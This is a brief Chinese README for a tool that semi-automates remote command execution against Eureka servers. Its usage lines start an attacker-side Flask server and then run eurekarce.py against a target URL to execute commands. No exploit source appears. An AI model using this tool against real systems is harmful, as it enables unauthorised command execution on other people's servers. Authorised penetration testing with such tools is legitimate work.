## 介绍
半自动的eureka rce命令执行，免得每次命令执行都去手动修改重启flask

### 使用方法
先运行`python flaskserver.py`开启服务，记录随机端口，然后再运行`python eurekarce.py -u http://127.0.0.1:9090/ -s http://10.0.0.3:12989 -v 1`指定相应的参数即可执行命令

![result](https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202311261538996.png)
